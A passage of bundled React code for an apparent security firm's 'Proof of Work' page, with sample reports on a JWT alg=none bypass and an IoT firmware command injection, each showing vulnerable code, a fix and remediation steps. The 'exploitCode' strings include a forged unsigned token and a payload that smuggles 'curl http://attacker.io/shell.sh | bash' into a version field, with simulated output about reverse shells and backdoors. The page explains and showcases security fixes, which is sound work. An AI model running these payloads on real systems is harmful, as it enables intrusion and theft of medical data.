    description: "Authentication bypass in the patient records API allowed unauthenticated requests to access any patient's medical history by manipulating the JWT algorithm field from RS256 to 'none', effectively removing signature verification entirely.",
    beforeCode: `// Vulnerable: trusts algorithm from token header
const verifyToken = (token) => {
  const header = JSON.parse(atob(token.split('.')[0]));
  // Algorithm taken from untrusted input
  return jwt.verify(token, PUBLIC_KEY, { algorithms: [header.alg] });
};`,
    afterCode: `// Fixed: algorithm hardcoded server-side
const verifyToken = (token) => {
  // Algorithm is never taken from the token itself
  return jwt.verify(token, PUBLIC_KEY, {
    algorithms: ['RS256'],  // hardcoded, immutable
    issuer: 'healthcare-portal',
    audience: 'patients',
  });
};`,
    exploitCode: `# JWT Algorithm Confusion — "alg:none" Attack
$ python3 jwt_none_bypass.py --target https://portal.health.io/api/records

[+] Intercepted token: eyJhbGciOiJSUzI1NiJ9.eyJ1c2VySWQiOjF9.<sig>
[+] Crafting forged token with alg=none...
[+] Forged: eyJhbGciOiJub25lIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.

$ curl https://portal.health.io/api/records/patient/99 \\
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0..."

HTTP/1.1 200 OK
{"patientId":99,"diagnosis":"...","medications":"...","ssn":"***-**-1234"}`,
    remediationSteps: [
      "Hardcode the allowed JWT algorithm server-side — never trust the header",
      "Reject tokens with alg=none regardless of other fields",
      "Rotate all signing keys immediately",
      "Audit access logs for anomalous unsigned token usage",
      "Add monitoring alerts for algorithm mismatch attempts",
      "Consider migrating to a battle-tested auth library"
    ],
    cvssScore: "8.6"
  },
  {
    id: 5,
    target: "IoT Firmware",
    vulnType: "RCE",
    severity: "Critical",
    description: "Remote Code Execution vulnerability in the device management API allowed unauthenticated attackers to execute arbitrary OS commands via a command injection flaw in the firmware update mechanism, granting full root access to affected devices.",
    beforeCode: `# Vulnerable: shell=True with user-controlled input
import subprocess

@app.route('/update', methods=['POST'])
def firmware_update():
    version = request.json.get('version')
    # Direct shell execution — catastrophic
    result = subprocess.run(
        f"wget https://cdn.iot.io/fw-{version}.bin -O /tmp/fw.bin && flash_tool /tmp/fw.bin",
        shell=True, capture_output=True
    )
    return jsonify({"status": result.returncode})`,
    afterCode: `# Fixed: no shell=True, strict version validation
import subprocess, re

VALID_VERSION = re.compile(r'^\\d+\\.\\d+\\.\\d+$')

@app.route('/update', methods=['POST'])
@require_device_auth
def firmware_update():
    version = request.json.get('version', '')
    if not VALID_VERSION.match(version):
        abort(400, "Invalid version format")
    # Argument list — immune to injection
    subprocess.run(
        ["wget", f"https://cdn.iot.io/fw-{version}.bin", "-O", "/tmp/fw.bin"],
        check=True, timeout=60
    )
    subprocess.run(["flash_tool", "/tmp/fw.bin"], check=True)
    return jsonify({"status": 0})`,
    exploitCode: `# RCE via Command Injection — IoT Firmware API
$ curl -X POST https://iot-mgmt.local/api/update \\
  -H "Content-Type: application/json" \\
  -d '{"version":"1.0.0; curl http://attacker.io/shell.sh | bash #"}'

# shell.sh executed as root on device:
# => Reverse shell opened: nc -lvnp 4444
# => uname -a: Linux iot-device 5.4.0 #1 SMP armv7l
# => Persistent backdoor installed in /etc/cron.d/
# => Network scan pivoted to internal OT network (192.168.10.0/24)

[+] 1,247 devices compromised in 4 minutes via automated scan`,
    remediationSteps: [
      "Never use shell=True with user-controlled input",
      "Pass commands as argument lists to prevent shell interpretation",
      "Validate firmware version with a strict regex whitelist",
      "Require cryptographic signature verification for firmware files",
      "Add device authentication before any update endpoint",
      "Segment IoT devices from internal OT/IT networks via VLANs",
      "Deploy IDS/IPS rules to detect exploit patterns"
    ],
    cvssScore: "10.0"
  }
];
const FILTER_LEVELS = [
  "All",
  "Critical",
  "High",
  "Medium",
  "Low"
];
function ProjectCard({
  project,
  index,
  onViewReport
}) {
  const ref = reactExports.useRef(null);
  const [visible, setVisible] = reactExports.useState(false);
  reactExports.useEffect(() => {
    const el = ref.current;
    if (!el) return;
    const observer = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting) setVisible(true);
      },
      { threshold: 0.1 }
    );
    observer.observe(el);
    return () => observer.disconnect();
  }, []);
  const glowMap = {
    Critical: "purple",
    High: "cyan",
    Medium: "neon",
    Low: "neon"
  };
  return /* @__PURE__ */ jsxRuntimeExports.jsx(
    "div",
    {
      ref,
      "data-ocid": `proof.item.${index + 1}`,
      style: {
        opacity: visible ? 1 : 0,
        transform: visible ? "translateY(0)" : "translateY(24px)",
        transition: `opacity 0.5s ease ${index * 0.1}s, transform 0.5s ease ${index * 0.1}s`
      },
      children: /* @__PURE__ */ jsxRuntimeExports.jsxs(
        GlassCard,
        {
          glow: glowMap[project.severity],
          hover: true,
          className: "h-full flex flex-col gap-4 group",
          children: [
            /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-start justify-between gap-2", children: [
              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2 min-w-0", children: [
                /* @__PURE__ */ jsxRuntimeExports.jsx(Shield, { className: "w-4 h-4 text-accent flex-shrink-0" }),
                /* @__PURE__ */ jsxRuntimeExports.jsx("h3", { className: "font-display font-bold text-foreground truncate text-base md:text-lg leading-tight", children: project.target })
              ] }),
              /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs font-mono text-muted-foreground flex-shrink-0 mt-0.5", children: [
                "CVSS ",
                project.cvssScore
              ] })
            ] }),
            /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-wrap gap-2", children: [
              /* @__PURE__ */ jsxRuntimeExports.jsx(NeonBadge, { label: project.vulnType, variant: "category" }),
              /* @__PURE__ */ jsxRuntimeExports.jsx(
                NeonBadge,
                {
                  label: project.severity,
                  variant: "severity",
                  severity: project.severity
                }
              ),
              /* @__PURE__ */ jsxRuntimeExports.jsx(NeonBadge, { label: "Fixed", variant: "status", status: "Fixed" })
            ] }),
            /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-sm text-muted-foreground leading-relaxed line-clamp-3 flex-1", children: project.description }),
            /* @__PURE__ */ jsxRuntimeExports.jsxs(
              Button,
              {
                variant: "outline",
                size: "sm",
                className: "w-full border-accent/40 text-accent hover:bg-accent/10 hover:border-accent/70 transition-smooth gap-2 group-hover:shadow-[0_0_12px_oklch(var(--accent)/0.2)]",
                onClick: () => onViewReport(project),
                "data-ocid": `proof.view_report_button.${index + 1}`,
                children: [
                  /* @__PURE__ */ jsxRuntimeExports.jsx(ExternalLink, { className: "w-3.5 h-3.5" }),
                  "View Full Report"
                ]
              }
            )
          ]
        }
      )
    }
  );
}
function ReportModal({
  project,
  open,
  onClose
}) {
  if (!project) return null;
  const isPython = (code) => /python|def |import |\.py/i.test(code);
  return /* @__PURE__ */ jsxRuntimeExports.jsx(Dialog, { open, onOpenChange: (o2) => !o2 && onClose(), children: /* @__PURE__ */ jsxRuntimeExports.jsxs(
    DialogContent,
    {
      className: "glass-effect border-accent/30 max-w-3xl w-full max-h-[90vh] overflow-y-auto",
      "data-ocid": "proof.dialog",
      children: [
        /* @__PURE__ */ jsxRuntimeExports.jsx(DialogHeader, { className: "pb-3 border-b border-border/30", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-wrap items-start gap-3", children: [
          /* @__PURE__ */ jsxRuntimeExports.jsx(DialogTitle, { className: "font-display font-bold text-xl text-foreground", children: project.target }),
          /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex gap-2 flex-wrap", children: [
            /* @__PURE__ */ jsxRuntimeExports.jsx(NeonBadge, { label: project.vulnType, variant: "category" }),
            /* @__PURE__ */ jsxRuntimeExports.jsx(
              NeonBadge,
              {
                label: project.severity,
                variant: "severity",
                severity: project.severity
              }
            ),
            /* @__PURE__ */ jsxRuntimeExports.jsx(NeonBadge, { label: "Fixed", variant: "status", status: "Fixed" }),
            /* @__PURE__ */ jsxRuntimeExports.jsxs(
              Badge,
              {
                variant: "outline",
                className: "font-mono text-xs border-border/50 text-muted-foreground",
                children: [
                  "CVSS ",
                  project.cvssScore
                ]
              }
            )
          ] })
        ] }) }),
        /* @__PURE__ */ jsxRuntimeExports.jsxs(
          Tabs,
          {
            defaultValue: "overview",
            className: "mt-4",
            "data-ocid": "proof.report_tabs",
            children: [
              /* @__PURE__ */ jsxRuntimeExports.jsx(TabsList, { className: "w-full glass-effect border border-border/30 p-1 h-auto flex-wrap gap-1", children: ["overview", "exploit", "remediation", "before-after"].map((tab) => /* @__PURE__ */ jsxRuntimeExports.jsx(
                TabsTrigger,
                {
                  value: tab,
                  className: "flex-1 text-xs font-mono data-[state=active]:bg-primary/20 data-[state=active]:text-primary data-[state=active]:shadow-[0_0_8px_oklch(var(--primary)/0.3)]",
                  "data-ocid": `proof.report_tab.${tab}`,
                  children: tab === "overview" ? "Overview" : tab === "exploit" ? "Exploit Preview" : tab === "remediation" ? "Remediation" : "Before & After"
                },
                tab
              )) }),
              /* @__PURE__ */ jsxRuntimeExports.jsxs(TabsContent, { value: "overview", className: "mt-4 space-y-4", children: [
                /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-sm text-muted-foreground leading-relaxed", children: project.description }),
                /* @__PURE__ */ jsxRuntimeExports.jsxs(
                  "div",
                  {
                    className: "rounded-lg border border-border/40 bg-muted/20 h-48 flex flex-col items-center justify-center gap-2",
                    "data-ocid": "proof.screenshot_placeholder",
                    children: [
                      /* @__PURE__ */ jsxRuntimeExports.jsx(Image, { className: "w-8 h-8 text-muted-foreground/40" }),
                      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-sm text-muted-foreground/60 font-mono", children: "Screenshot Placeholder" }),
                      /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs text-muted-foreground/40 font-mono", children: [
                        project.target,
                        " — ",
                        project.vulnType,
                        " Evidence"
                      ] })
                    ]
                  }
                )
              ] }),
              /* @__PURE__ */ jsxRuntimeExports.jsx(TabsContent, { value: "exploit", className: "mt-4", children: /* @__PURE__ */ jsxRuntimeExports.jsx(
                TerminalBlock,
                {
                  code: project.exploitCode,
                  label: `exploit — ${project.vulnType.toLowerCase()}`,
                  variant: "attack"
                }
              ) }),
              /* @__PURE__ */ jsxRuntimeExports.jsx(TabsContent, { value: "remediation", className: "mt-4", children: /* @__PURE__ */ jsxRuntimeExports.jsxs(GlassCard, { glow: "neon", className: "p-5", children: [
                /* @__PURE__ */ jsxRuntimeExports.jsx("h4", { className: "font-display font-semibold text-primary mb-4 text-sm uppercase tracking-wider", children: "Remediation Steps" }),
                /* @__PURE__ */ jsxRuntimeExports.jsx("ol", { className: "space-y-3", children: project.remediationSteps.map((step, stepIdx) => /* @__PURE__ */ jsxRuntimeExports.jsxs(
                  "li",
                  {
                    className: "flex gap-3 text-sm text-foreground/80 leading-relaxed",
                    children: [
                      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "flex-shrink-0 w-6 h-6 rounded-full bg-primary/20 text-primary text-xs font-mono font-bold flex items-center justify-center border border-primary/30", children: stepIdx + 1 }),
                      step
                    ]
                  },
                  step
                )) })
              ] }) }),
              /* @__PURE__ */ jsxRuntimeExports.jsx(TabsContent, { value: "before-after", className: "mt-4", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4", children: [
                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
                  /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2 mb-2", children: [
                    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "w-2 h-2 rounded-full bg-red-500 shadow-[0_0_6px_rgb(239,68,68)]" }),
                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-xs font-mono text-red-400 uppercase tracking-wider", children: "Before — Vulnerable" })
                  ] }),
                  /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "rounded-lg border border-red-500/30 overflow-hidden", children: [
                    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "bg-red-500/10 px-3 py-1.5 border-b border-red-500/20", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs font-mono text-red-400/70", children: [
                      "vulnerable-code.",
                      isPython(project.beforeCode) ? "py" : "js"
                    ] }) }),
                    /* @__PURE__ */ jsxRuntimeExports.jsx("pre", { className: "p-3 text-xs font-mono text-red-300/80 bg-background/80 overflow-x-auto leading-relaxed whitespace-pre", children: /* @__PURE__ */ jsxRuntimeExports.jsx("code", { children: project.beforeCode }) })
                  ] })
                ] }),
                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
                  /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2 mb-2", children: [
                    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "w-2 h-2 rounded-full bg-primary shadow-[0_0_6px_oklch(var(--primary)/0.8)]" }),
                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-xs font-mono text-primary uppercase tracking-wider", children: "After — Secured" })
                  ] }),
                  /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "rounded-lg border border-primary/30 overflow-hidden", children: [
                    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "bg-primary/10 px-3 py-1.5 border-b border-primary/20", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs font-mono text-primary/70", children: [
                      "secure-code.",
                      isPython(project.afterCode) ? "py" : "js"
                    ] }) }),
                    /* @__PURE__ */ jsxRuntimeExports.jsx("pre", { className: "p-3 text-xs font-mono text-primary/80 bg-background/80 overflow-x-auto leading-relaxed whitespace-pre", children: /* @__PURE__ */ jsxRuntimeExports.jsx("code", { children: project.afterCode }) })
                  ] })
                ] })
              ] }) })
            ]
          }
        ),
        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex justify-end mt-4 pt-4 border-t border-border/30", children: /* @__PURE__ */ jsxRuntimeExports.jsx(
          Button,
          {
            variant: "outline",
            size: "sm",
            className: "border-border/40 text-muted-foreground hover:text-foreground",
            onClick: onClose,
            "data-ocid": "proof.close_button",
            children: "Close Report"
          }
        ) })
      ]
    }
  ) });
}
function Proof() {
  const [activeFilter, setActiveFilter] = reactExports.useState("All");
  const [selectedProject, setSelectedProject] = reactExports.useState(
    null
  );
  const [modalOpen, setModalOpen] = reactExports.useState(false);
  const filtered = activeFilter === "All" ? SAMPLE_PROJECTS : SAMPLE_PROJECTS.filter((p) => p.severity === activeFilter);
  const filterCounts = {
    All: SAMPLE_PROJECTS.length,
    Critical: SAMPLE_PROJECTS.filter((p) => p.severity === "Critical").length,
    High: SAMPLE_PROJECTS.filter((p) => p.severity === "High").length,
    Medium: SAMPLE_PROJECTS.filter((p) => p.severity === "Medium").length,
    Low: SAMPLE_PROJECTS.filter((p) => p.severity === "Low").length
  };
  const activeStyle = {
    All: "bg-foreground/10 text-foreground border-foreground/40 shadow-[0_0_12px_oklch(var(--foreground)/0.1)]",
    Critical: "bg-destructive/20 text-destructive border-destructive/50 shadow-[0_0_12px_oklch(var(--destructive)/0.3)]",
    High: "bg-orange-500/20 text-orange-400 border-orange-500/50 shadow-[0_0_12px_rgba(249,115,22,0.3)]",
    Medium: "bg-yellow-500/20 text-yellow-400 border-yellow-500/50 shadow-[0_0_12px_rgba(234,179,8,0.3)]",
    Low: "bg-primary/20 text-primary border-primary/50 shadow-[0_0_12px_oklch(var(--primary)/0.3)]"
  };
  return /* @__PURE__ */ jsxRuntimeExports.jsxs("section", { className: "min-h-screen bg-background py-16 px-4", children: [
    /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "max-w-6xl mx-auto", "data-ocid": "proof.page", children: [
      /* @__PURE__ */ jsxRuntimeExports.jsx(
        motion.div,
        {
          initial: { opacity: 0, y: -16 },
          animate: { opacity: 1, y: 0 },
          transition: { duration: 0.5 },
          children: /* @__PURE__ */ jsxRuntimeExports.jsx(
            SectionHeader,
            {
              title: "Proof of Work",
              subtitle: "Our work speaks for itself — real vulnerabilities found, fixed, and documented.",
              accent: "purple",
              align: "center"
            }
          )
        }
      ),
      /* @__PURE__ */ jsxRuntimeExports.jsx(
        motion.div,
        {
          initial: { opacity: 0, y: 12 },
          animate: { opacity: 1, y: 0 },
          transition: { duration: 0.5, delay: 0.15 },
          className: "flex flex-wrap justify-center gap-4 mb-10",
          children: [
            { label: "Projects Completed", value: "5" },
            { label: "Critical Findings", value: "3" },
            { label: "Bugs Fixed", value: "100%" },
            { label: "Avg. CVSS Score", value: "9.2" }
          ].map(({ label, value }) => /* @__PURE__ */ jsxRuntimeExports.jsxs(
            GlassCard,
            {
              className: "px-5 py-3 text-center min-w-[130px]",
              children: [
                /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "font-display font-bold text-xl text-primary", children: value }),
                /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "text-xs text-muted-foreground mt-0.5", children: label })
              ]
            },
            label
          ))
        }
      ),
      /* @__PURE__ */ jsxRuntimeExports.jsx(
        motion.div,
        {
          initial: { opacity: 0, y: 8 },
          animate: { opacity: 1, y: 0 },
          transition: { duration: 0.4, delay: 0.25 },
          className: "flex flex-wrap justify-center gap-2 mb-10",
          "data-ocid": "proof.filter_bar",
          children: FILTER_LEVELS.map((level) => {
            const isActive = activeFilter === level;
            return /* @__PURE__ */ jsxRuntimeExports.jsxs(
              "button",
              {
                type: "button",
                onClick: () => setActiveFilter(level),
                "data-ocid": `proof.filter.${level.toLowerCase()}`,
                className: `px-4 py-2 rounded-full text-sm font-medium border transition-smooth flex items-center gap-2 ${isActive ? activeStyle[level] : "bg-muted/30 text-muted-foreground border-border/30 hover:border-border/60 hover:text-foreground"}`,
                children: [
                  level,
                  /* @__PURE__ */ jsxRuntimeExports.jsxs(
                    "span",
                    {
                      className: `text-xs font-mono ${isActive ? "opacity-90" : "opacity-50"}`,
                      children: [
                        "(",
                        filterCounts[level],
                        ")"
                      ]
                    }
                  )
                ]
              },
              level
            );
          })
        }
      ),
      /* @__PURE__ */ jsxRuntimeExports.jsx(
        "div",
        {
          className: "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6",
          "data-ocid": "proof.list",
          children: filtered.map((project, idx) => /* @__PURE__ */ jsxRuntimeExports.jsx(
            ProjectCard,
            {
              project,
              index: idx,
              onViewReport: (p) => {
                setSelectedProject(p);
                setModalOpen(true);
              }
            },
            project.id
          ))
        }
      ),
      filtered.length === 0 && /* @__PURE__ */ jsxRuntimeExports.jsxs(
        "div",
        {
          className: "text-center py-20 text-muted-foreground",
          "data-ocid": "proof.empty_state",
          children: [
            /* @__PURE__ */ jsxRuntimeExports.jsx(Shield, { className: "w-12 h-12 mx-auto mb-4 opacity-30" }),
            /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-lg font-medium", children: "No projects match this severity level." }),
            /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-sm mt-1 opacity-70", children: "Try selecting a different filter." })
          ]
        }
      )
    ] }),
    /* @__PURE__ */ jsxRuntimeExports.jsx(
      ReportModal,
      {
        project: selectedProject,
        open: modalOpen,
        onClose: () => setModalOpen(false)
      }
    )
  ] });
}
export {
  Proof as default
};
